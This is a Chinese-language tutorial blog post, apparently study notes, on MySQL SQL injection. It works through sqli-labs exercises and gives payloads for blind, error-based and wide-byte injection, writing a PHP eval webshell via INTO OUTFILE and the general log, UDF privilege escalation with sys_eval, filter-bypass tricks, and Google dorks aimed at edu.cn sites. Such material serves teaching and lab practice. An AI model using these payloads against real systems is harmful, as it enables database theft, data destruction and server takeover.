---
title: SQL 注入
published: 2025-03-09 16:44:04
tags: [WEB安全,通用漏洞]
category: 安全
draft: false
---

# SQL 注入

## SQL 注入原理

是指`web`应用程序对用户输入数据没有合法性的判断和过滤，导致攻击者可以”修改“`SQL`语句，在不会触发任何策略的时候通过数据库获取敏感数据

产生条件：传递给后端的参数是可控制的，参数内容会被带入到数据库中进行执行

## SQL 注入整体的思路

### 总体流程

1. 判断数据库类型
2. SQL 注入
    
    识别注入点：攻击者首先确定应用程序中哪些输入字段（如登录表单、搜索框、URL 参数）直接用于构造 SQL 查询。
    构造恶意输入：攻击者输入特制的 SQL 代码，试图改变原本的查询结构。
    执行恶意查询：通过恶意输入，攻击者可能会查看数据库表结构、窃取数据、修改数据，甚至执行系统命令
    
3. SQL 注入的常见类型
基于错误的 `SQL` 注入：利用数据库错误信息来推断数据库结构。
联合查询注入（`UNION-based SQL Injection`）：使用 UNION 合并多个查询结果，从而泄露更多信息。
布尔盲注（`Boolean-based Blind SQL Injection`）：通过观察应用程序的响应来推断查询结果。
时间盲注（`Time-based Blind SQL Injection`）：通过执行时间延迟命令，推断查询结果。

### 在哪找注入点呢？

也可以通过Google搜索语法：`inurl:id=xx` 这种；或者在常见的可能会操作数据库的地方，例如：搜索框、分页导航、评论输入、信息输入等

```bash
inurl:news.asp?id=site:edu.cn
inurl:news.php?id= site:edu.cn
inurl:news.aspx?id=site:edu.cn
```

### 注入数据类型

**数值型**，**字符型**，**搜索型**（模糊查询），**编码型**，**json型**

- **数值型**：表示整数或浮点数的数据类型。常见的数值型数据包括 `int`、`float` 等。例如，用户在输入框中输入数字或金额。
- **字符型**：表示文本数据的数据类型。通常用于存储和操作字符串，例如用户输入的名称、地址、描述等。常见的字符型数据类型包括 `char`、`varchar` 等。
- **搜索型（模糊查询）**：用于对数据库中的文本字段进行模糊匹配查询。通常使用 SQL 的 `LIKE` 操作符或全文搜索技术，例如 `%keyword%` 查询匹配任何包含 `keyword` 的字符串。
- **编码型**：通常指使用特定编码格式的数据类型，如 Base64 编码、URL 编码等。这种数据通常需要在传输或存储前进行编码和解码操作，以保证数据的完整性和安全性。
- **JSON型**：表示 JavaScript 对象表示法（JSON）格式的数据类型。这种数据类型非常适合存储和传输复杂的嵌套数据结构，通常用于 Web 开发中。数据库如 PostgreSQL 和 MongoDB 支持原生的 JSON 数据类型。

## SQL注入类型

[SQL注入漏洞（类型篇）_sql注入漏洞分类-CSDN博客](https://blog.csdn.net/qq_51295677/article/details/125408885?spm=1001.2014.3001.5502)

提交方式：`get` ，`post` ，`header`：`xff`，`referer`，`ua`

### 宽字节注入

宽字节是相对于`ascII`这样单字节而言的；像`GB2312`、`GBK`、`GB18030`、`BIG5`、`Shift_JIS`等这些都是常说的宽字节，实际上只有两字节

GBK是一种多字符的编码，通常来说，一个`gbk`编码汉字，占用2个字节。一个`utf-8`编码的汉字，占用3个字节

宽字节注入使用字符为`%df` 也就是 `�` 

1. 常过滤函数
    1. **`trim()`函数**
        
        移除字符串两侧的空白字符或其他预定义字符
        
    2. **`htmlspecialchars()`函数**
        
        把预定义的字符"`<`"和"`>`"转换为`HTML`实体，预防`XSS`
        
    3. **`addslashes()`函数**
        
        返回在预定义字符之前添加反斜杠的字符串
        
        ```python
        # 预定义字符
        1.单引号(')
        2.双引号(")
        3.反斜杠(\)
        4.NULL
        ```
        
2. 宽字节注入使用条件
    1. 数据库编码使用`GBK`
        
        查看`Mysql`字符集
        
        ```python
        show variables like '%char%';
        mysql> show variables like '%char%';
        +--------------------------+--------------------------------------------------------+
        | Variable_name            | Value                                                  |
        +--------------------------+--------------------------------------------------------+
        | character_set_client     | utf8                                                   |
        | character_set_connection | utf8                                                   |
        | character_set_database   | utf8                                                   |
        | character_set_filesystem | binary                                                 |
        | character_set_results    | utf8                                                   |
        | character_set_server     | utf8                                                   |
        | character_set_system     | utf8                                                   |
        | character_sets_dir       | C:\phpstudy_pro\Extensions\MySQL5.7.26\share\charsets\ |
        +--------------------------+--------------------------------------------------------+
        8 rows in set, 1 warning (0.00 sec)
        ```
        
    2. 存在转义函数阻碍
3. 实例 - Sqli-labs 32
    1. 输入`1'` ,发现被转义了
        
        ![image.png](image%205.png)
        
    2. 尝试使用宽字节注入 `%df` ,出现报错，表示转义函数已经对`'` 不起效了
        
        ![image.png](image%206.png)
        
    3. 接着闭合成功
        
        ![image.png](image%207.png)
        
    4. 实际上的流程
        
        `%df%27` 浏览器url自动解码===> `β\'`转为16进制===> `0xdf0x5c0x27` 转换为url编码===> `%df%5c%27` 进行url解码(因为是GBK编码，`%df`和`%5c`结合为汉字)===> `運'`
        
        所以斜杠就被吃掉了，`%df`和`%5c`才可以结合为汉字，`%df`和`\`是无法结合的
        

### 报错注入

> mysql数据库中显示错误描述是因为开发程序中采用了`print_r  mysql_error()`函数，将`mysql`错误信息输出
> 
1. **extractvalue & updatexml**
    
    > Mysql 版本 > 5.1 ，两个函数都是基于`Xpath`报错 ，因为 `~` 不属于`Xpath`语法，所以会报错
    > 
    1. **updatexml**
        
        ```python
        # SQLi labs - 06
        /Less-6/?id=1" and (select updatexml(1,concat('~',(select database())),1))--+
        /Less-6/?id=1" and updatexml(1,concat('~',(select database())),1) --+
        ```
        
    2. **extractvalue** 
        
        ```python
        /Less-6/?id=1" and extractvalue(1,concat('~',database(),'~',user()))--+
        /Less-6/?id=1" and (select extractvalue(1,concat('~',database(),'~',user())))--+
        ```
        
    3. Tips：当`'~'` 被过滤是可以用`0x7e` 代替
2. floor
    
    > 利用`select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x;`导致数据库报错，通过`concat`函数连接注入语句与`floor(rand(0)*2)`函数，实现将注入结果与报错信息回显的注入方式
    > 
    
    至少要求数据记录为 3 行，记录数超过 3 行一定会报错，2 行时是不报错的
    
    ```python
    # 判断是否存在 floor 报错注入
    /Less-6/?id=1" union select 1,count(*),floor(rand(0)*2) x from information_schema.tables group by x--+
    # 表
    /Less-6/?id=1" union select 1,count(*),concat(floor(rand(0)*2),database()) x from information_schema.tables group by x--+
    ```
    

### 布尔盲注

用`substr`和`length` 函数来实现Sql注入（PS: 费时费力，用脚本）

当注入有数据回但数据无法显示出来时使用，通过布尔值来判断数据

```python
# 判断 数据库名长度是否为 8，为 8 时回显，不为 8 不回显
/Less-5/?id=1' and length(database())=8 and '1
# 判断数据库名 第一个 字 是否为 s;以此类推，判断到第八位即可....
/Less-5/?id=1' and substr(database(),1,1)='s' and '1
/Less-5/?id=1' and substr(database(),1,8)='security' --+
```

写脚本时一般通过`ASCII`表来搭配使用

```python
# 爆表信息
## 爆表数量，表数量为4个
/Less-5/?id=1' and (select count(*) from information_schema.tables where table_schema = 'security') = 4 --+

## 爆出所有表名的总长度，为29位
/Less-5/?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema = 'security')) = 29 --+

## 逐个破解表名字，第一个表名的第一个字母是 e，对应 ascii 值是101
/Less-5/?id=1' and ascii(subtr((select group_concat(table_name) from information_schema.tables where table_schema = 'security'),1,1))=101 --+
```

### 延时注入

通过控制语句正确然后使用`sleep`函数制造时间延迟，来判断是否报错

在SQL注入时页面不管正确不正确都不会回显数据时可以使用

**if(expr1,expr2,expr3)含义是如果expr1是True,则返回expr2,否则返回expr3**

```python
# 判断页面闭合，闭合成功页面会延迟 3 秒再加载
/Less-9/?id=1' and if(1=2,1,sleep(3))--+
# 判断数据表名长度， 正确页面会延迟 3 秒再加载
/Less-9/?id=1' and if(length(database())=8,sleep(3),1)--+
```

剩下和布尔盲注差不多，配合`=` `<` `>` 使用

### 增删改查语句注入

- **SELECT语句**：
    - 用于从数据库中查询数据。
    - 示例：
        
        ```sql
        SELECT * FROM users WHERE username = 'admin';
        ```
        
    - 注入示例：在用户名字段输入上面的内容，将会生成以下SQL语句：这会返回所有用户，因为`'1'='1'`总是为真。
        
        ```sql
        ' OR '1'='1
        ```
        
        ```sql
        SELECT * FROM users WHERE username = '' OR '1'='1';
        ```
        
- **INSERT语句**：
    - 用于向数据库中插入新记录。
    - 示例：
        
        ```sql
        INSERT INTO users (username, password) VALUES ('newuser', 'password123');
        ```
        
    - 注入示例：在用户名字段输入上面的内容，将会生成以下SQL语句：这将尝试删除用户表。
        
        ```sql
        '); DROP TABLE users; --
        ```
        
        ```sql
        INSERT INTO users (username, password) VALUES (''); DROP TABLE users; --', 'password123');
        ```
        
- **UPDATE语句**：
    - 用于修改数据库中的现有记录。
    - 示例：
        
        ```sql
        UPDATE users SET password = 'newpassword' WHERE username = 'user';
        ```
        
    - 注入示例：在用户名字段输入上面的内容，将会生成以下SQL语句：这将尝试删除用户表。
        
        ```sql
        user'; DROP TABLE users; --
        ```
        
        ```sql
        UPDATE users SET password = 'newpassword' WHERE username = 'user'; DROP TABLE users; --';
        ```
        
- **DELETE语句**：
    - 用于删除数据库中的记录。
    - 示例：
        
        ```sql
        DELETE FROM users WHERE username = 'user';
        ```
        
    - 注入示例：在用户名字段输入上面的内容，将会生成以下SQL语句：这将删除所有用户，因为`'1'='1'`总是为真。
        
        ```sql
        ' OR '1'='1
        ```
        
        ```sql
        DELETE FROM users WHERE username = '' OR '1'='1';
        ```
        

## SQLgetshell

### into outfile

1. 利用条件
    
    into outfile 是 Mysql 中的一个函数，我们能够利用它来进行写入文件的操作。但是 Mysql 中关于此类能够写入文件的函数都会有所限制，`secure_file_priv`参数就是用来限制 `load，dumpfile，into outfile，load_file()`这几个关于文件写入操作的函数在哪个目录下拥有上传和读取文件的权限。
    
    - secure_file_priv 的值为null 时，表示限制 mysqld 不允许导入 | 导出
    - secure_file_priv 的值为某一个具体目录时：/tmp 这种，表示 mysqld 的导入和导出只能发生在/tmp 目录下
    - 当secure_file_priv 的值为没有值时，表示不对 mysqld 的导入导出功能有任何限制
    - web目录具有写权限，能够使用单引号
    - 知道网站绝对路径（根目录，或则是根目录往下的目录都行）
2. 关于`secure_file_priv` 的值
    1. 查看
        
        ```python
        show global variables like '%secure%';
        ```
        
        ![image.png](image%208.png)
        
    2. 修改值
        
        我们可以在mysql/`my.ini`中查看是否有secure_file_priv 的参数，如果没有的话我们就添加 **`secure_file_priv = ''`** 即可
        
3. 例子：以Sql-labs less7
    
    ![image.png](image%209.png)
    
    `?id=3')) and sleep(5) --+`时成功延时，所以注入点就为`3'))`
    
    注入常规流程省略，表列数为`3`列，网站绝对路径为 `C:\sqil-labs-master\`
    
    - 写入`webshell` ，可以写入一句话木马，最好进行`16`进制转码，路径而是双斜杠是因为转义字符
        
        ```python
        # 不使用16进制编码版本
        Less-7/?id=1')) union select 1,2,'<?php @eval($_POST[1]); ?>' into outfile 'C:\\sqli-labs-master\\out_file.php' --+
        # 使用16进制编码，需要在前面加上0x
        Less-7/?id=1')) union select 1,2,0x3c3f70687020406576616c28245f504f53545b315d293b203f3e into outfile 'C:\\sqli-labs-master\\out_file.php' --+
        ```
        
        回到windows目录看可以看到已经上传了
        
        ![image.png](image%2010.png)
        
    - 连接`webshell` ，连接成功
        
        ![image.png](image%2011.png)
        

### into dumpfile

效果其实和`outfile`是一样的

```python
Less-7/?id=1')) union select 1,2,0x3c3f70687020406576616c28245f504f53545b315d293b203f3e into dumpfile 'C:\\sqli-labs-master\\out_file.php' --+
```

`outfile` 和 `dumpfile` 两者有些区别：

1. 在读取内容的时候 dumpfile 只能读取一行的数据，而 outfile 能够读取多行的数据
2. dumpfile 读取内容不会去修改原始数据的格式，而 outfile 在遇到特殊格式时是会自动格式转化的，这一点在我们后续 UDF 提权中会有所体现

### 日志文件写入shell

 MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell

**开启全局日志写入shell**

1. 首先看全局日志是否开启
    
    `show variables like '%general%';`
    
2. 如下就是没开
    
    ![image.png](image%2012.png)
    
    这里有两个参数，一个是`general_log`，用来限定数据库是否会将用户的 mysql 指令操作记录写入日志文件，value 对应 ON。`general_log_file`就是日志文件的默认存储路径了
    
    那很明显这两个参数我们都需要去修改，并且要设置这些参数的值，我们还需要当前 SQL 查询支持多行查询（堆叠注入），在 php 中具体的函数就是`mysqli_multi_query`，这是一个限制很大的利用方法
    
3. 如何设置值
    
    ```python
    set global general_log = "ON";
    set global general_log_file='C:/Sql-labs/sqli-labs-master/Less-38/shell.php'
    ```
    
4. 在`Less-38`测试
    
    ```python
    /Less-38/?id=0';set global general_log = "ON";set global general_log_file='C:/sqli-labs-master/Less-38/shel.php';
    ```
    
    执行完我们再去查看`general` ，成功修改
    
    ![image.png](image%2013.png)
    
5. 执行`webshell`
    
    首先得在某一处输入一句马，让其写入日志，注意不要写错，写错了出现`error`就无法继续包含
    
    ```python
    Less-38/?id=<?php @eval($_POST[1]); ?>
    ```
    
    执行后我们到windows查看是否插入日志成功
    
    ![image.png](image%2014.png)
    
    看见成功写入后，我们去测试
    
    ![image.png](image%2015.png)
    

### UDF 提权

> [https://www.sqlsec.com/2020/11/mysql.html#CVE-2012-2122](https://www.sqlsec.com/2020/11/mysql.html#CVE-2012-2122)
> 

自定义函数，是数据库功能的一种扩展。用户通􏰁自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 `version()`等方便

1. 前提secure_file_priv需要等于空或者等于插件目录
    
    ```sql
    SHOW VARIABLES LIKE "secure_file_priv";
    ```
    
2. **动态链接库**
    
    如果是 `MySQL >= 5.1` 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数
    
    动态链接库可以在`metasploit`获取
    
    ```sql
    MSF 根目录/embedded/framework/data/exploits/mysql
    //
    lib_mysqludf_sys_32.dll
    lib_mysqludf_sys_32.so  
    lib_mysqludf_sys_64.dll  
    lib_mysqludf_sys_64.so
    ```
    
3. 寻找插件目录
    
    ```sql
    mysql> show variables like '%plugin%';
    +---------------+-----------------------+
    | Variable_name | Value                 |
    +---------------+-----------------------+
    | plugin_dir    | /usr/lib/mysql/plugin |
    +---------------+-----------------------+
    ```
    
    如果不存在的话可以在 `webshell`中找到 MySQL 的安装目录然后手工创建 `\lib\plugin` 文件夹
    
4. 写入**动态链接库**
    
    SQL 注入且是高权限，plugin 目录可写且需要 `secure_file_priv` 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库
    
    ```sql
    sqlmap -u "http://localhost:30008/" --data="id=1" --file-write="/Users/sec/Desktop/lib_mysqludf_sys_64.so" --file-dest="/usr/lib/mysql/plugin/udf.so"
    ```
    
    不过一般都是手工写文件到 plugin 目录下的
    
    ```sql
    # 直接 SELECT 查询十六进制写入
    SELECT 0x7f454c4602... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
    
    # 解码十六进制再写入多此一举
    SELECT unhex('7f454c4602...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
    ```
    
    文件的16进制可以通过mysql自带的hex函数编码
    
    ```sql
    # 直接传入路径编码
    SELECT hex(load_file('/lib_mysqludf_sys_64.so'));
    
    # 也可以将路径 hex 编码
    SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));
    ```
    
    一般可以
    
    ```sql
    mysql> use mysql;
    
    mysql> create table foo(line blob);
    Query OK, 0 rows affected (0.00 sec)
    
    mysql> insert into foo values (load_file('/tmp/lib_mysqludf_sys_64.so'))
    Query OK, 1 row affected (0.00 sec)
    
    mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/udf.so';
    Query OK, 1 row affected (0.00 sec)
    ```
    
5. 创建函数
    
    ```sql
    mysql> create function sys_eval returns string soname 'udf.so';
    Query OK, 0 rows affected (0.00 sec)
    
    mysql> select * from mysql.func; 
    +----------+-----+--------+----------+
    | name     | ret | dl     | type     |
    +----------+-----+--------+----------+
    | sys_eval |   2 | udf.so | function |
    +----------+-----+--------+----------+
    
    mysql> select sys_eval('whoami'); // 函数存在root函数
    +--------------------+
    | sys_eval('whoami') |
    +--------------------+
    | root               |
    +--------------------+
    ```
    

## 绕过技巧

1. 空格 
    
    注释符 `/* */` ，编码 `%a0`
    
    括号绕过空格，常用于`time based`盲注
    
    ```bash
    ?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
    ```
    
2. 引号绕过
    
    十六进制
    
    ```bash
    selectcolumn_namefrominformation_schema.tableswheretable_name="users"
    ```
    
    ```bash
    selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273
    ```
    
3. 逗号绕过
    
    常用于`limit`或者`substr`
    
    ```bash
    ?id=1' and if(ascii(substr(database() from 1 for 1))=115,sleep(5),1)--+
    // 等价于
    ?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+
    ```
    
    ```bash
    select*fromnews limit0,1
    //
    select*fromnews limit 1 offset 0
    ```
    
4. 比较符号绕过
    
    在盲注使用二分法的时候可以用到
    
    ```bash
    select * from users where id=1 and ascii(substr(database(),0,1))>64
    // 
    select* from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
    ```
    
5. or and 绕过
    
    ```bash
    || &&
    ```
    
6. 绕过闭合符号 `--+` `#`
    
    闭合语句绕过
    
    ```bash
    select * from user where id='{}';
    //
    id=1'union select 1,2,3||'1
    // 就变成
    select * from user where id='1'union select 1,2,3||'1';
    ```
    
7. `=` 绕过
    
    `like` 或者 `<`  `>`
    
8. 绕过 union，select ，where 等
    
    常见注释符：`//`,`--` ,`/**/`, `#`, `--+`,`-- -`,`;`,`%00`,`--a`
    
    ```bash
    U/**/NION/**/SE/**/LECT/**/user，pwd from user
    ```
    
    大小写绕过
    
    ```bash
    UniOn SeLeCt 1,2,3
    ```
    
    内敛注释绕过
    
    ```bash
    id=-1'/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#
    ```
    
    双关键字绕过
    
    ```bash
    ununionion select
    ```
    
9. 通用编码绕过
    
    URl，ASCII，HEX，unicode